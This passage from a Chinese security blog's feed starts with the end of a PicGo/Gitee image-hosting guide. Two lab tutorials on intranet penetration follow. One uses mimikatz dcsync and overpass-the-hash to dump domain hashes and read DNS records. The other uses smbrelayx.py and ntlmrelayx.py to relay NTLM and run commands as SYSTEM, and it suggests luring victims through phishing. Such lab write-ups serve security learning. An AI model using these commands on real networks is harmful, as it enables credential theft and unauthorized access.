<h3 id="配置-picgo"><a class="anchor" href="#配置-picgo">#</a> 配置 PicGo</h3>
<p>打开  <code>PicGo</code>  面板，</p>
<ul>
<li>仓库名格式为  <code>用户名/仓库名</code></li>
<li>分支名： <code>master</code></li>
<li>token：上一个咱们创建的 <code>token</code></li>
</ul>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20211203194829243.png" alt="image-20211203194829243" /></p>
<p>然后点击确定即可完成绑定，然后设置成默认图床即可。</p>
<p>工具默认上传前不做重命名，如果需要在上传前重新命名，我们可以到  <code>PicGo</code>  设置中进行设置，把上传前重命名开关打开即可。</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20211203194847622.png" alt="image-20211203194847622" /></p>
<p>与此同时，除了单张上传外，其实还支持多张，批量上传，只需要选中多个文件，将其导入，或者拖入其中便可以了，这样再多的文件，也能够做到一次上传就能用的效果。</p>
<h3 id="效果"><a class="anchor" href="#效果">#</a> 效果</h3>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20211203194900932.png" alt="image-20211203194900932" /></p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20211203194913223.png" alt="image-20211203194913223" /></p>
<h2 id="gitee"><a class="anchor" href="#gitee">#</a> Gitee</h2>
<p><strong> <code>注：码云设置限制之后需要添加开源许可证之后才能正常访问！！！</code> </strong></p>
<p>为什么又换成了 <code>Gitee</code> ？因为 <code>Github</code>  的网络对国内不稳定，所以就换成了 <code>Gitee</code> 。</p>
<p><code>PicGo</code>  默认是不支持码云，也就是 <code>Gitee</code> ，所以需要先下载插件，具体下载操作如下：</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20211203193907542.png" alt="image-20211203193907542" /></p>
<h3 id="配置码云信息"><a class="anchor" href="#配置码云信息">#</a> 配置码云信息</h3>
<p>首先将 <code>gitee</code>  添加到我们的图床设置</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20211203193953049.png" alt="image-20211203193953049" /></p>
<p>完成后，可以看到左方菜单栏 “<strong>图床设置</strong>”—&gt; &quot;<strong>gitee</strong>&quot;</p>
<h3 id="创建码云仓库"><a class="anchor" href="#创建码云仓库">#</a> 创建码云仓库</h3>
<p>这里的做法和在 <code>Github</code>  上差不多</p>
<p>登录 <code>Gitee</code> ：<span class="exturl" data-url="aHR0cHM6Ly9naXRlZS5jb20v">https://gitee.com/</span><br />
 进入个人主页，点击新建仓库</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20211203194019193.png" alt="image-20211203194019193" /></p>
<p>填写基本仓库基本信息保存即可。</p>
<p><strong>注</strong>：这里同样选择<strong>公开仓库</strong></p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20211203194112487.png" alt="image-20211203194112487" /></p>
<h3 id="获取仓库访问token"><a class="anchor" href="#获取仓库访问token">#</a> 获取仓库访问 token</h3>
<p><code>PicGo</code>  上传图片需要通过 <code>gitee</code>  的 <code>API</code> ，因此要获取 <code>token</code>  授权，获取方式如下：</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20211203194136342.png" alt="image-20211203194136342" /></p>
<p>同样是在个人设置里，选择私人令牌</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20211203194302300.png" alt="image-20211203194302300" /></p>
<p>点击 &quot;生成新令牌&quot;</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20211203194323747.png" alt="image-20211203194323747" /></p>
<p>勾选相关权限如下：</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20211203194336263.png" alt="image-20211203194336263" /></p>
<p>最后生成令牌，同样需要马上复制保存，因为之后就不会再出现这个 <code>token</code>  了。</p>
<h2 id="picgo配置码云"><a class="anchor" href="#picgo配置码云">#</a> PicGo 配置码云</h2>
<p>点击 &quot;图床配置&quot; 里面的 <code>gitee</code>  选项，就可以看到相关配置信息</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20211203194410728.png" alt="image-20211203194410728" /></p>
<p><code>repo</code> :  <code>gitee</code>  用户名 / 仓库名</p>
<p><code>branch</code> : 分支名</p>
<p><code>token</code> : 码云的 <code>token</code> ，复制上一步的 <code>token</code></p>
<p><code>path</code> : 图片在仓库的保存路径，可以根据自己的情况填写</p>
<h2 id="typora配置picgo"><a class="anchor" href="#typora配置picgo">#</a> Typora 配置 PicGo</h2>
<p>接下来在 <code>Typora</code>  里配置我们的 <code>PicGo</code>  服务就大功告成了！</p>
<p>打开 <code>Typora</code>  偏好设置，进入图像页面，配置 <code>picgo</code>  相关项即可</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20211203194459129.png" alt="image-20211203194459129" /></p>
<p>可点击 “图片验证”，进行上传测试如下：</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20211203194523866.png" alt="image-20211203194523866" /></p>
]]></content>
      <categories>
        <category>SNote</category>
      </categories>
      <tags>
        <tag>SNote</tag>
      </tags>
  </entry>
  <entry>
    <title>域渗透——DNS记录的获取</title>
    <url>/article/9ce09b1b.html</url>
    <content><![CDATA[<h2 id="00x00-前言"><a class="anchor" href="#00x00-前言">#</a> 00x00 前言</h2>
<p>早上一觉起来码子变红了是什么体验，crazy！！！</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20211210152111868.png" alt="image-20211210152111868" /></p>
<h2 id="00x01-简介"><a class="anchor" href="#00x01-简介">#</a> 00x01 简介</h2>
<p>本文将要介绍以下内容：</p>
<figure class="highlight javascript"><figcaption data-lang="javascript"></figcaption><table><tr><td data-num="1"></td><td><pre>通过<span class="token constant">DNS</span> Manager获取<span class="token constant">DNS</span>记录</pre></td></tr><tr><td data-num="2"></td><td><pre>通过dnscmd获取<span class="token constant">DNS</span>记录</pre></td></tr><tr><td data-num="3"></td><td><pre>域内远程读取<span class="token constant">DNS</span>记录的方法</pre></td></tr></table></figure><h2 id="00x02-通过dns-manager获取dns记录"><a class="anchor" href="#00x02-通过dns-manager获取dns记录">#</a> 00x02 通过 DNS Manager 获取 DNS 记录</h2>
<p>测试系统：</p>
<figure class="highlight javascript"><figcaption data-lang="javascript"></figcaption><table><tr><td data-num="1"></td><td><pre>Windows Server <span class="token number">2012</span> <span class="token constant">R2</span> x64</pre></td></tr></table></figure><p>选择‘工具’ -&gt;  <code>DNS</code> 。</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20211210153159220.png" alt="image-20211210153159220" /></p>
<p>在‘正向查找区域’下找到当前域名，能够显示当前域内的 <code>DNS</code>  记录，包括主机名和对应的 <code>IP</code> 。</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20211210153404620.png" alt="image-20211210153404620" /></p>
<h2 id="00x03-通过dnscmd获取dns记录"><a class="anchor" href="#00x03-通过dnscmd获取dns记录">#</a> 00x03 通过 dnscmd 获取 DNS 记录</h2>
<h3 id="dnscmd"><a class="anchor" href="#dnscmd">#</a> dnscmd</h3>
<p>用来管理 <code>DNS</code>  服务器的命令行接口，支持远程连接。</p>
<p>默认安装的系统：</p>
<figure class="highlight javascript"><figcaption data-lang="javascript"></figcaption><table><tr><td data-num="1"></td><td><pre>Windows Server <span class="token number">2003</span></pre></td></tr><tr><td data-num="2"></td><td><pre>Windows Server <span class="token number">2008</span></pre></td></tr><tr><td data-num="3"></td><td><pre>Windows Server <span class="token number">2003</span> <span class="token constant">R2</span></pre></td></tr><tr><td data-num="4"></td><td><pre>Windows Server <span class="token number">2008</span> <span class="token constant">R2</span></pre></td></tr><tr><td data-num="5"></td><td><pre>Windows Server <span class="token number">2012</span></pre></td></tr><tr><td data-num="6"></td><td><pre>Windows Server <span class="token number">2003</span> <span class="token keyword">with</span> <span class="token constant">SP1</span></pre></td></tr><tr><td data-num="7"></td><td><pre>…</pre></td></tr></table></figure><p>常用命令:</p>
<p>(1) 列出 DNS 区域中当前节点的资源记录：</p>
<figure class="highlight javascript"><figcaption data-lang="javascript"></figcaption><table><tr><td data-num="1"></td><td><pre>Dnscmd <span class="token punctuation">.</span> <span class="token operator">/</span>EnumZones</pre></td></tr></table></figure><p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20211210153733524.png" alt="image-20211210153733524" /></p>
<p>(2) 列出 http://21r000.org 的信息：</p>
<figure class="highlight javascript"><figcaption data-lang="javascript"></figcaption><table><tr><td data-num="1"></td><td><pre>Dnscmd <span class="token punctuation">.</span> <span class="token operator">/</span>ZoneInfo 21r000<span class="token punctuation">.</span>org</pre></td></tr></table></figure><p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20211210153837641.png" alt="image-20211210153837641" /></p>
<p>(3) 列举 http://21r000.org 中的记录，方法 1 (更详细)：</p>
<figure class="highlight javascript"><figcaption data-lang="javascript"></figcaption><table><tr><td data-num="1"></td><td><pre>Dnscmd <span class="token punctuation">.</span> <span class="token operator">/</span>ZonePrint 21r000<span class="token punctuation">.</span>org</pre></td></tr></table></figure><p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20211210154011017.png" alt="image-20211210154011017" /></p>
<p>(4) 列举 http://21r000.org 的记录，方法 2：</p>
<figure class="highlight javascript"><figcaption data-lang="javascript"></figcaption><table><tr><td data-num="1"></td><td><pre>Dnscmd <span class="token punctuation">.</span> <span class="token operator">/</span>EnumRecords 21r000<span class="token punctuation">.</span>org <span class="token punctuation">.</span></pre></td></tr></table></figure><p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20211210154108829.png" alt="image-20211210154108829" /></p>
<p>结果同 <code>DNS Manager</code>  获取的记录一致。</p>
<h2 id="00x04-域内远程读取dns记录的方法"><a class="anchor" href="#00x04-域内远程读取dns记录的方法">#</a> 00x04 域内远程读取 DNS 记录的方法</h2>
<h3 id="方法分析"><a class="anchor" href="#方法分析">#</a> 方法分析</h3>
<p>前提需要获得域管理员的权限。</p>
<p>第一种方法是先远程连接域控制器，然后在域控制器上执行 <code>dnscmd</code>  获取 <code>DNS</code>  记录。</p>
<p>第二种方法是在域内一台主机上面，执行 <code>dnscmd</code>  远程读取 <code>DNS</code>  记录。</p>
<p>在未安装 <code>Remote Server Administration Tools (RSAT)</code>  的系统上执行 <code>dnscmd</code> ，需要满足以下条件：</p>
<figure class="highlight javascript"><figcaption data-lang="javascript"></figcaption><table><tr><td data-num="1"></td><td><pre>dnscmd保存在路径<span class="token constant">C</span><span class="token operator">:</span>WindowsSystem32下</pre></td></tr><tr><td data-num="2"></td><td><pre></pre></td></tr><tr><td data-num="3"></td><td><pre>dnscmd<span class="token punctuation">.</span>exe<span class="token punctuation">.</span>mui保存在<span class="token constant">C</span><span class="token operator">:</span>WindowsSystem32en<span class="token operator">-</span><span class="token constant">US</span><span class="token function">下</span><span class="token punctuation">(</span>该位置比较通用，也可以在其他位置<span class="token punctuation">)</span></pre></td></tr></table></figure><p>注： <code>dnscmd</code>  和 <code>dnscmd.exe.mui</code>  使用该<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tLzNnc3R1ZGVudC90ZXN0Lw==">项目</span>中的即可。</p>
<p><span class="exturl" data-url="aHR0cHM6Ly9zdXBwb3J0Lm1pY3Jvc29mdC5jb20vZW4tdXMvaGVscC8yNjkzNjQzL3JlbW90ZS1zZXJ2ZXItYWRtaW5pc3RyYXRpb24tdG9vbHMtcnNhdC1mb3Itd2luZG93cy1vcGVyYXRpbmctc3lzdGVtcw==">Win7 系统安装 Remote Server Administration Tools (RSAT) 教程</span></p>
<p>由于 <code>dnscmd</code>  在远程连接时，未提供输入用户名和口令的接口，这里需要借助 <code>mimikatz</code>  的 <code>Overpass-the-hash</code> 。</p>
<p>首先需要获得域管理员用户的 <code>hash</code> ，这里只能用 <code>ntlm/rc4/aes128/aes256</code></p>
<p>如果获得了域管理员用户的明文口令，可以先将明文转为 <code>ntlm</code> ，<span class="exturl" data-url="aHR0cHM6Ly9tZDVkZWNyeXB0Lm5ldC9lbi9OdGxtLw==">在线加解密的网站</span></p>
<p>域控制器上执行 <code>mimikatz</code> ，使用 <code>dcsync</code>  获得域内所有用户 <code>hash</code> ：</p>
<figure class="highlight javascript"><figcaption data-lang="javascript"></figcaption><table><tr><td data-num="1"></td><td><pre>mimikatz<span class="token punctuation">.</span>exe privilege<span class="token operator">:</span><span class="token operator">:</span>debug <span class="token string">"lsadump::dcsync /domain:21r000.org /all /csv exit"</span></pre></td></tr></table></figure><p>测试环境的参数如下：</p>
<figure class="highlight javascript"><figcaption data-lang="javascript"></figcaption><table><tr><td data-num="1"></td><td><pre>域管理员用户：Administrator</pre></td></tr><tr><td data-num="2"></td><td><pre>口令：DomainAdmin456<span class="token operator">!</span></pre></td></tr><tr><td data-num="3"></td><td><pre>hash：<span class="token constant">A55E0720F0041193632A58E007624B40</span></pre></td></tr></table></figure><p>Overpass-the-hash:</p>
<figure class="highlight javascript"><figcaption data-lang="javascript"></figcaption><table><tr><td data-num="1"></td><td><pre>mimikatz<span class="token punctuation">.</span>exe privilege<span class="token operator">:</span><span class="token operator">:</span>debug <span class="token string">"sekurlsa::pth /user:Administrator /domain:21r000.org /ntlm:A55E0720F0041193632A58E007624B40"</span></pre></td></tr></table></figure><p>这样会弹出一个 <code>cmd.exe</code></p>
<p>接着使用 <code>dnscmd</code>  远程连接进行查询：</p>
<figure class="highlight javascript"><figcaption data-lang="javascript"></figcaption><table><tr><td data-num="1"></td><td><pre>Dnscmd <span class="token constant">WIN</span><span class="token operator">-</span><span class="token constant">F08C969D7FM</span><span class="token punctuation">.</span>21r000<span class="token punctuation">.</span>org <span class="token operator">/</span>EnumZones</pre></td></tr></table></figure><p>或者直接用计算机名称:</p>
<figure class="highlight javascript"><figcaption data-lang="javascript"></figcaption><table><tr><td data-num="1"></td><td><pre>Dnscmd <span class="token constant">WIN</span><span class="token operator">-</span><span class="token constant">F08C969D7FM</span> <span class="token operator">/</span>EnumZones</pre></td></tr></table></figure><p>注：这里要使用 <code>FQDN</code>  或者计算机名。</p>
<p>如果想在命令行下实现整个流程，可以采用如下方法：</p>
<p>新建 <code>c:test1.bat</code> ，内容如下：</p>
<figure class="highlight javascript"><figcaption data-lang="javascript"></figcaption><table><tr><td data-num="1"></td><td><pre>Dnscmd <span class="token constant">WIN</span><span class="token operator">-</span><span class="token constant">F08C969D7FM</span><span class="token punctuation">.</span>21r000<span class="token punctuation">.</span>org <span class="token operator">/</span>EnumZones <span class="token operator">></span> c<span class="token operator">:</span>testout<span class="token punctuation">.</span>txt</pre></td></tr></table></figure><p>Overpass-the-hash:</p>
<figure class="highlight javascript"><figcaption data-lang="javascript"></figcaption><table><tr><td data-num="1"></td><td><pre>mimikatz<span class="token punctuation">.</span>exe privilege<span class="token operator">:</span><span class="token operator">:</span>debug <span class="token string">"sekurlsa::pth /user:Administrator /domain:21r000.org /ntlm:A55E0720F0041193632A58E007624B40 /run:"</span>cmd<span class="token punctuation">.</span>exe <span class="token operator">/</span>c c<span class="token operator">:</span>test1<span class="token punctuation">.</span>bat<span class="token string">""</span></pre></td></tr></table></figure><p>注： <code>cmd.exe</code>  下 &quot;需要使用转义字符&quot;</p>
<p>参考链接：</p>
<p><span class="exturl" data-url="aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl8zOTY3OTM3MC9hcnRpY2xlL2RldGFpbHMvMTEwMzAzNDAy">bat 域 本机管理员密码_域渗透 ——DNS 记录的获取</span></p>
]]></content>
      <categories>
        <category>内网渗透</category>
      </categories>
      <tags>
        <tag>内网渗透</tag>
      </tags>
  </entry>
  <entry>
    <title>内网渗透学习之 Net-NTLM Relay Attack</title>
    <url>/article/aea05eaa.html</url>
    <content><![CDATA[<h2 id="net-ntlm-relay-attack漏洞原理"><a class="anchor" href="#net-ntlm-relay-attack漏洞原理">#</a> Net-NTLM Relay Attack 漏洞原理</h2>
<p><code>Net-NTLM Relay</code>  原理，它是发生在  <code>NTLM</code>  认证的第三步，客户端发送使用服务端  <code>NTLM Hash</code>  加密的  <code>Challenge</code>  值，得到  <code>Net-NTLMHash</code> 。我们就是要重放这个  <code>Net-NTLMHash</code>  来进行攻击。</p>
<p>所以，进行 <code>NTLM Relay</code>  攻击的第一步我们首先要获得这个 <code>Net-NTLMHash</code>  值。那么如何能获得这个 <code>Net-NTLMHash</code>  值呢？思路是让受害者把  <code>Net-NTLMhash</code>  自己发送给攻击者，也就是说只要是使用  <code>SMB</code> 、 <code>HTTP</code> 、 <code>LDAP</code> 、 <code>MSSQL</code>  等协议来进行  <code>NTLM</code>  认证的程序，都可以尝试用来向攻击者发送  <code>Net-NTLM hash</code> 。</p>
<p>在内网渗透中若利用  <code>LLMNR/NetBIOS</code>  成功劫持并获得了目标主机的  <code>Net-NTLM Hash</code> ，如果我们有一个强大的字典也可以进行爆破。</p>
<p><code>Net-NTLM Hash</code>  不像  <code>NTLM-Hash</code> ，我们不能用  <code>Net-NTLM Hash</code>  来进行  <code>Pass The Hash</code> 。所以我们可以试着通过 <code>NTLM Relay Attack</code>  来实现。</p>
<h2 id="通过-smb-来进行-relay-attack"><a class="anchor" href="#通过-smb-来进行-relay-attack">#</a> 通过 SMB 来进行 Relay Attack</h2>
<p><code>SMB</code>  协议的  <code>Relay</code>  攻击，可直接  <code>Relay</code>  到  <code>smb</code>  服务器，是最直接最有效的方法。</p>
<p>通过  <code>SMB Relay Attack</code>  我们可以在目标远程服务器上执行命令，上传我们的恶意  <code>exe</code>  ，又或者到远程服务上执行恶意代码 ... 等等</p>
<h3 id="relay-attack-的两种场景"><a class="anchor" href="#relay-attack-的两种场景">#</a> Relay Attack 的两种场景：</h3>
<h4 id="1工作组环境"><a class="anchor" href="#1工作组环境">#</a> 1：工作组环境</h4>
<p>在工作组环境里面，工作组中的机器之间相互没有信任关系，每台机器的账号密码  <code>Hash</code>  只是保存在自己的  <code>SAM</code>  文件中，这个时候  <code>Relay</code>  到别的机器可能性就不大，除非两台机器的账号密码一样，不然毫无意义。</p>
<h4 id="2域环境"><a class="anchor" href="#2域环境">#</a> 2：域环境</h4>
<p>我们知道在域环境下所有域用户的账号密码  <code>Hash</code>  都保存在域控的  <code>ntds.dit</code>  里面。若没有限制域用户登录到某台机子，那就可以将该域用户  <code>Relay</code>  到别人的机子，或者是拿到域控的请求，将域控  <code>Relay</code>  到普通的机子，比如域管运维所在的机器。</p>
<p><strong>PS</strong>：域环境下域控默认开启  <code>smb</code>  签名</p>
<h2 id="当前环境"><a class="anchor" href="#当前环境">#</a> 当前环境</h2>
<table>
<thead>
<tr>
<th>目标</th>
<th>机器</th>
<th>IP</th>
<th>子网掩码</th>
</tr>
</thead>
<tbody>
<tr>
<td>攻击人员 21r000</td>
<td>Kali Linux</td>
<td>10.211.55.15</td>
<td>255.0.0.0</td>
</tr>
<tr>
<td>域控制器</td>
<td>Windows 20012server</td>
<td>10.211.55.12</td>
<td>255.0.0.0</td>
</tr>
<tr>
<td>域内机器</td>
<td>Win 7</td>
<td>10.211.55.7</td>
<td>255.0.0.0</td>
</tr>
</tbody>
</table>
<h2 id="kali-加入域"><a class="anchor" href="#kali-加入域">#</a> Kali 加入域</h2>
<p>配置如下:</p>
<figure class="highlight javascript"><figcaption data-lang="javascript"></figcaption><table><tr><td data-num="1"></td><td><pre>Windows Server <span class="token number">2012</span> <span class="token constant">R2</span> x64</pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token literal-property property">计算机名</span><span class="token operator">:</span> Server2012</pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token literal-property property">计算机全名</span><span class="token operator">:</span> Server2012<span class="token punctuation">.</span>21r000<span class="token punctuation">.</span>org</pre></td></tr><tr><td data-num="4"></td><td><pre><span class="token literal-property property">域</span><span class="token operator">:</span> 21r000<span class="token punctuation">.</span>org</pre></td></tr><tr><td data-num="5"></td><td><pre><span class="token literal-property property">域控管理员</span><span class="token operator">:</span> administrator</pre></td></tr><tr><td data-num="6"></td><td><pre>普通用户：21r000</pre></td></tr></table></figure><p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20211207175302148.png" alt="image-20211207175302148" /></p>
<p>安装软件:</p>
<figure class="highlight javascript"><figcaption data-lang="javascript"></figcaption><table><tr><td data-num="1"></td><td><pre>sudo apt install aptitude</pre></td></tr><tr><td data-num="2"></td><td><pre>sudo aptitude install sssd realmd <span class="token operator">-</span>y</pre></td></tr><tr><td data-num="3"></td><td><pre>sudo apt<span class="token operator">-</span><span class="token keyword">get</span> install adcli realmd krb5<span class="token operator">-</span>user samba<span class="token operator">-</span>common<span class="token operator">-</span>bin samba<span class="token operator">-</span>libs samba<span class="token operator">-</span>dsdb<span class="token operator">-</span>modules sssd sssd<span class="token operator">-</span>tools libnss<span class="token operator">-</span>sss libpam<span class="token operator">-</span>sss packagekit policykit<span class="token operator">-</span><span class="token number">1</span> </pre></td></tr><tr><td data-num="4"></td><td><pre>sudo apt<span class="token operator">-</span><span class="token keyword">get</span> install samba # 如果需要samba共享目录给Windows。需要安装这个</pre></td></tr></table></figure><p>编辑 <code>/etc/resolve.conf</code>  文件，将 <code>DNS</code>  指向 <code>Server2012</code></p>
<figure class="highlight javascript"><figcaption data-lang="javascript"></figcaption><table><tr><td data-num="1"></td><td><pre>sudo vim <span class="token operator">/</span>etc<span class="token operator">/</span>resolv<span class="token punctuation">.</span>conf</pre></td></tr></table></figure><p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20211207180356222.png" alt="image-20211207180356222" /></p>
<p>编辑 <code>/etc/hosts</code>  文件，添加 <code>Server2012</code>  的 <code>IP</code>  及域的对应关系</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20211207183014658.png" alt="image-20211207183014658" /></p>
<p>编辑 <code>IP</code>  地址</p>
<figure class="highlight javascript"><figcaption data-lang="javascript"></figcaption><table><tr><td data-num="1"></td><td><pre>vi <span class="token operator">/</span>etc<span class="token operator">/</span>network<span class="token operator">/</span>interfaces</pre></td></tr></table></figure><p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20211207181420632.png" alt="image-20211207181420632" /></p>
<figure class="highlight javascript"><figcaption data-lang="javascript"></figcaption><table><tr><td data-num="1"></td><td><pre>inface eth0 inet <span class="token keyword">static</span>    #设置 eth0 使用默认的静态地址</pre></td></tr><tr><td data-num="2"></td><td><pre></pre></td></tr><tr><td data-num="3"></td><td><pre>address <span class="token number">10.211</span><span class="token number">.55</span><span class="token number">.15</span>   #设置 eth0 的ip 地址</pre></td></tr><tr><td data-num="4"></td><td><pre></pre></td></tr><tr><td data-num="5"></td><td><pre>gatework <span class="token number">10.211</span><span class="token number">.55</span><span class="token number">.1</span>    #配置当前主机的默认网关</pre></td></tr><tr><td data-num="6"></td><td><pre></pre></td></tr><tr><td data-num="7"></td><td><pre>netmask  <span class="token number">255.0</span><span class="token number">.0</span><span class="token number">.0</span>   #设置 eth0 的子网掩码</pre></td></tr></table></figure><p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20211207183602996.png" alt="image-20211207183602996" /></p>
<p>重新配置网卡信息</p>
<figure class="highlight javascript"><figcaption data-lang="javascript"></figcaption><table><tr><td data-num="1"></td><td><pre>dhclient</pre></td></tr></table></figure><p>将 <code>Linux</code>  机器加入域</p>
<figure class="highlight javascript"><figcaption data-lang="javascript"></figcaption><table><tr><td data-num="1"></td><td><pre>realm join Server2012<span class="token punctuation">.</span>21r000<span class="token punctuation">.</span>org <span class="token operator">-</span><span class="token constant">U</span> administrator</pre></td></tr><tr><td data-num="2"></td><td><pre></pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token operator">--</span> Server2012<span class="token punctuation">.</span>21r000<span class="token punctuation">.</span>org 为 <span class="token constant">DC</span> 主机名</pre></td></tr><tr><td data-num="4"></td><td><pre><span class="token operator">--</span> administrator 为域管理员账号</pre></td></tr></table></figure><p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20211207185640793.png" alt="image-20211207185640793" /></p>
<p>查看是否成功加入</p>
<figure class="highlight javascript"><figcaption data-lang="javascript"></figcaption><table><tr><td data-num="1"></td><td><pre>realm list</pre></td></tr></table></figure><h2 id="通过-smbrelayxpy-进行-relay-attack"><a class="anchor" href="#通过-smbrelayxpy-进行-relay-attack">#</a> 通过 <span class="exturl" data-url="aHR0cDovL3NtYnJlbGF5eC5weQ==">smbrelayx.py</span> 进行 Relay Attack</h2>
<p>1、在攻击人员 <code>21r000</code>  上执行如下命令监听  <code>80</code>  和  <code>445</code>  端口，伪造  <code>http</code>  和  <code>smb</code>  服务：</p>
<figure class="highlight javascript"><figcaption data-lang="javascript"></figcaption><table><tr><td data-num="1"></td><td><pre>#SMBRelay 攻击 <span class="token number">10.211</span><span class="token number">.55</span><span class="token number">.7</span> 主机，并执行 whoami 命令</pre></td></tr><tr><td data-num="2"></td><td><pre>python3 smbrelayx<span class="token punctuation">.</span>py <span class="token operator">-</span>h <span class="token number">10.211</span><span class="token number">.55</span><span class="token number">.7</span> <span class="token operator">-</span>c whoami</pre></td></tr></table></figure><p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20211207191230754.png" alt="image-20211207191230754" /></p>
<p>2、通过钓鱼或者其他手段诱导域管理员或域用户访问了攻击人员 <code>21r000</code>  伪造的  <code>HTTP</code>  或  <code>SMB</code>  服务，访问 <span class="exturl" data-url="aHR0cDovLzEwLjIxMS41NS4xNQ==">http://10.211.55.15</span> ，并输入账号密码进行认证：</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20211207191427263.png" alt="image-20211207191427263" /></p>
<p>3、此时就  <code>Relay</code>  成功获取到  <code>10.211.55.7</code>  的  <code>system</code>  权限（当然只是  <code>whoami</code>  命令，实战中可以直接远程加载  <code>powershell</code>  或者其他手段反弹  <code>Shell</code>  到  <code>C2</code> ）</p>
<h2 id="通过-ntlmrelayxpy-进行-relay-attack"><a class="anchor" href="#通过-ntlmrelayxpy-进行-relay-attack">#</a> 通过 <span class="exturl" data-url="aHR0cDovL250bG1yZWxheXgucHk=">ntlmrelayx.py</span> 进行 Relay Attack</h2>
<p>1、在攻击人员 <code>21r000 </code>  上执行如下命令监听  <code>80</code>  和  <code>445</code>  端口，伪造  <code>http</code>  和  <code>smb</code>  服务：</p>
<figure class="highlight javascript"><figcaption data-lang="javascript"></figcaption><table><tr><td data-num="1"></td><td><pre># SMBRelay 攻击 <span class="token number">10.211</span><span class="token number">.55</span><span class="token number">.7</span> 主机，并执行 whoami 命令</pre></td></tr><tr><td data-num="2"></td><td><pre>python3 ntlmrelayx<span class="token punctuation">.</span>py <span class="token operator">-</span>t smb<span class="token operator">:</span><span class="token operator">/</span><span class="token operator">/</span><span class="token number">10.211</span><span class="token number">.55</span><span class="token number">.7</span> <span class="token operator">-</span>c whoami <span class="token operator">-</span>smb2support</pre></td></tr></table></figure><p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20211207192015624.png" alt="image-20211207192015624" /></p>
<p>2、通过钓鱼或者其他手段诱导域管理员或域用户访问了攻击人员 <code>21r000</code>  伪造的  <code>HTTP</code>  或  <code>SMB</code>  服务，访问 <span class="exturl" data-url="aHR0cDovLzEwLjIxMS41NS4xNQ==">http://10.211.55.15</span>，并输入账号密码进行认证：</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20211207191427263.png" alt="image-20211207191427263" /></p>
<p>或者让域控随便访问一个资源使用  <code>smb</code>  触发：（因为它会检查本地  <code>host</code>  文件，然后检查  <code>DNS</code> ，如果都不存在，就会通过  <code>LLMNR</code>  协议进行多播，在局域网中进行搜索。此时可以在攻击机上看到  <code>Responder</code>  的响应，然后受害者的  <code>Windows</code>  机器会向攻击者进行身份验证）</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20211207192149736.png" alt="image-20211207192149736" /></p>
<p>3、此时就  <code>Relay</code>  成功获取到  <code>10.211.55.7</code>  的  <code>system</code>  权限：</p>
<h2 id="感言"><a class="anchor" href="#感言">#</a> 感言</h2>
<p>这里贴上项目地址：<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tLzIxcjAwMC9pbXBhY2tldA==">https://github.com/21r000/impacket</span></p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20211207192947911.png" alt="image-20211207192947911" /></p>
<h3 id="参考链接"><a class="anchor" href="#参考链接">#</a> 参考链接：</h3>
<p><span class="exturl" data-url="QXR0YWNraHR0cHM6Ly9tcC53ZWl4aW4ucXEuY29tL3Mvb3NuSUR1OW9nTVRlZEV6ZkdLUlR3UQ==">内网渗透中的 Net-NTLM Relay</span></p>
]]></content>
      <categories>
        <category>内网渗透</category>
      </categories>
      <tags>
        <tag>内网渗透</tag>
      </tags>
  </entry>
  <entry>
    <title>强网杯_mailbox2</title>
    <url>/article/ec7d43d7.html</url>
